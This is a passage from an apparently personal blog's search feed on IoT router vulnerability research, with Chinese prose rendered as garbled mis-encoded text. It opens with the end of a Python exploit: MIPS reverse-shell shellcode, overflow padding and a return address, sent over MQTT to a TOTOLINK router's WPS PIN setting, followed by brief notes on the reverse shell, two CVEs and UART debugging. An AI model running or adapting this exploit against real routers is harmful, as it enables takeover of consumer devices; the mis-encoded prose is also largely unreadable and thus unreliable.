class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x01</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\x4a<span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>\xfd\xff<span class="hljs-char escape_">\x11</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x88</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x02</span>\xff\xff\xa4\x8f<span class="hljs-char escape_">\x21</span><span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x02</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xdf\x0f<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>\xff\xff<span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xff\xff<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x22</span>\xfa\xff<span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x16</span>\xff\xff<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x28</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x62</span><span class="hljs-char escape_">\x69</span>\x0f\x3c\x2f\x2f\xef<span class="hljs-char escape_">\x35</span>\xec\xff\xaf\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x68</span>\x0e\x3c\x6e\x2f\xce<span class="hljs-char escape_">\x35</span>\xf0\xff\xae\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xf4\xff\xa0\xaf\xec\xff\xa4<span class="hljs-char escape_">\x27</span>\xf8\xff\xa4\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfc\xff\xa0\xaf\xf8\xff\xa5<span class="hljs-char escape_">\x27</span>\xab\x0f<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>&quot;</span><br><br><span class="hljs-variable">pay</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-operator">*</span><span class="hljs-number">60</span> <span class="hljs-operator">+</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x44</span><span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x42</span>&quot;</span><br><br><span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-variable">mqtt</span>.<span class="hljs-property">Client</span>()<br><span class="hljs-variable">client</span>.<span class="hljs-property">connect</span>(<span class="hljs-string">&quot;192.168.55.1&quot;</span>,<span class="hljs-number">1883</span>,<span class="hljs-number">60</span>)<br><span class="hljs-variable">client</span>.<span class="hljs-property">publish</span>(&#x27;<span class="hljs-variable">totolink</span>/<span class="hljs-variable">router</span>/<span class="hljs-variable">setting</span>/<span class="hljs-variable">setWiFiWpsConfig</span>&#x27;,<span class="hljs-variable">payload</span><span class="hljs-operator">=</span>&#x27;&#123;<span class="hljs-string">&quot;topicurl&quot;</span>:<span class="hljs-string">&quot;setting/setWiFiWpsConfig&quot;</span>,<span class="hljs-string">&quot;WiFiIdx&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;PINPBCRadio&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;PINMode&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;PIN&quot;</span>:<span class="hljs-string">&quot;&#x27;+pay+&#x27;&quot;</span>&#125;&#x27;<span class="hljs-operator">+</span>&#x27;<span class="hljs-variable">bbbbb</span>&#x27;<span class="hljs-operator">+</span><span class="hljs-variable">buf</span>)<br></code></pre></td></tr></table></figure><p>æ¯”è¾ƒè›‹ç–¼çš„æ˜¯å¥½åƒåªæœ‰python2å‘è¿‡å»çš„æ•°æ®æ˜¯æ­£å¸¸çš„ï¼Œpython3å°±æ˜¯ä¸€å †ä¹±ç </p><p>åå¼¹shellçš„ç›®æ ‡ä¸€å®šè¦å’Œè·¯ç”±å™¨åŒä¸€ä¸ªç½‘æ®µï¼Œä¸ç„¶å¼¹ä¸å‡ºæ¥</p><h1 id="0x4-å¸¦å­¦ç‰²çš„ç¬¬ä¸€æ¬¡æ¼æ´æŒ–æ˜"><a href="#0x4-å¸¦å­¦ç‰²çš„ç¬¬ä¸€æ¬¡æ¼æ´æŒ–æ˜" class="headerlink" title="0x4:å¸¦å­¦ç‰²çš„ç¬¬ä¸€æ¬¡æ¼æ´æŒ–æ˜"></a>0x4:å¸¦å­¦ç‰²çš„ç¬¬ä¸€æ¬¡æ¼æ´æŒ–æ˜</h1><p>æ°´äº†ä¸¤ä¸ªCVEï¼ˆCVE-2023-40041&amp;CVE-2023-40042)ï¼Œéƒ½æ˜¯ä½è´¨é‡æ¼æ´ï¼Œå½“æ—¶åªæƒ³ç€èƒ½ä¸èƒ½æ‹¿ä¸ªCVEä¹Ÿæ²¡æ€ä¹ˆæ·±æŒ–</p><h1 id="0x5-UARTä¸²å£è°ƒè¯•"><a href="#0x5-UARTä¸²å£è°ƒè¯•" class="headerlink" title="0x5: UARTä¸²å£è°ƒè¯•"></a>0x5: UARTä¸²å£è°ƒè¯•</h1><p>ç¬¬ä¸€æ¬¡ç„Šæ¥ï¼Œå±å®æ˜¯ä¸‘äº†ä¸€ç‚¹ï¼Œä½†å¥½åœ¨åŠŸèƒ½æ˜¯ä¸€ç‚¹é—®é¢˜éƒ½æ²¡æœ‰</p><p><img src="/img/iot1/0.jpg" alt="img"></p><p>Namelessçˆ·çˆ·æ¨èçš„ä¸‰æ’é’ˆç¡®å®æŒºå¥½ç”¨çš„ï¼Œä½†æ˜¯è¿™é€çš„é”¡ä¸å°±æ˜¯ä¸€å¨shitï¼Œè´¨é‡å·®çš„ä¸€æ‰¹ã€‚</p><p>ç”¨SecureCRTç›´æ¥quick connectå°±èƒ½è¿›ï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ç¬”è®°æœ¬ä¸¤ä¸ªCOMå£ä¸€ä¸ªè¿ä¸Šå»å°±æ˜¯æ²¡ååº”ï¼Œæ¢äº†ä¸€ä¸ªå°±è¡Œäº†ã€‚</p><p>ä½†è¿›å»åå¥‡æ€ªçš„æ˜¯åœ¨ubootåŠ è½½å¥½åkernelåŠ è½½ä¹‹å‰ç‹‚æŒ‰å›è½¦è¿›ä¸åˆ°ubootã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Iot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
